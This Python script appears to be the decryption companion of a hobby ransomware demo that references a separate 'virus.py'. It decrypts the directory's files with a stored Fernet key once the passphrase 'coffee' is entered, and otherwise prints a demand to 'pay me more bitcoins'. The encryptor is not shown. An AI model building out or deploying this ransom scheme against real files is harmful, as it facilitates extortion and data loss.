import os
from cryptography.fernet import Fernet

files = list()

for file in os.listdir():
    if file == "virus.py" or file == "secret.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# print(files)
with open("secret.key", "rb") as r_file:
    key = r_file.read()
# print(key)
secret_phrase = "coffee"
user_phrase = input("Enter secret phrase to decrypt your files\n")

if user_phrase == secret_phrase:
    for file in files:
        with open(file, "rb") as r_file:
            contents = r_file.read()
        # print(contents)
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(file, "wb") as w_file:
            w_file.write(contents_decrypted)
    print("Successfully decrypted your files. Enjoy your coffee")
else:
    print("Sorry, wrong phrase. pay me more bitcoins")